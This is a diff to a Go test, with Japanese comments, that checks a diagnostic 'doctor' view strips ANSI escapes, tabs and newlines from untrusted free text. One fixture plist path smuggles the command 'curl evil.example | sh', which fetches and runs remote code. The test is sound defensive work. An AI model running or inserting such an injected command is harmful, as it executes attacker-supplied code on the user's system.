@@ -1527,9 +1527,9 @@ func TestDoctorSnapshotTrustBoundaryFreeText(t *testing.T) {
 		Disk: disk.Report{Results: []disk.Result{{
 			Entry: disk.Entry{ID: "thing", Label: "Thing キャッシュ"}, Status: disk.StatusOK, Size: 4096,
 			MeasuredAt: now.Add(-time.Minute), Items: []disk.Item{{Path: "/ok", Size: 4096}},
-			Reason:   "壊れた\x1b[2J理由",
-			Failures: []string{"読めず\ttab で枠を壊す", "\x1b[31m赤く塗る"},
-			Contents: []string{"x\ty"},
+			Reason:   "壊れた\x1b[2J理由\n偽の行を足す",
+			Failures: []string{"読めず\ttab で枠を壊す\n偽の行", "\x1b[31m赤く塗る"},
+			Contents: []string{"x\ty\nz"},
 		}}},
 		Svc: svc.Report{Undiagnosed: []svc.Undiagnosed{
 			{PlistPath: "/Library/LaunchAgents/x; curl evil.example | sh #.plist", Reason: "壊れ\tた"},
@@ -1566,6 +1566,19 @@ func TestDoctorSnapshotTrustBoundaryFreeText(t *testing.T) {
 	for _, ng := range []string{"\t", "\x1b"} {
 		if strings.Contains(all, ng) {
 			t.Errorf("制御文字 %q が残った", ng)
+		}
+	}
+	// ディスク節の自由文は**1 件が 1 行**として描かれるので、改行も落とす。
+	// 残ると doctorRow.text に改行が入り、幅を数えるテストを素通りしたまま行数が増える
+	r0 := v.diskResults[0]
+	for _, s := range append(append([]string{r0.Reason}, r0.Failures...), r0.Contents...) {
+		if strings.Contains(s, "\n") {
+			t.Errorf("1 行として描く自由文に改行が残った: %q", s)
+		}
+	}
+	for _, line := range strings.Split(doctorText(v, 60), "\n") {
+		if strings.Contains(line, "\r") {
+			t.Errorf("1 行のはずの行に復帰が入った: %q", line)
 		}
 	}
 }
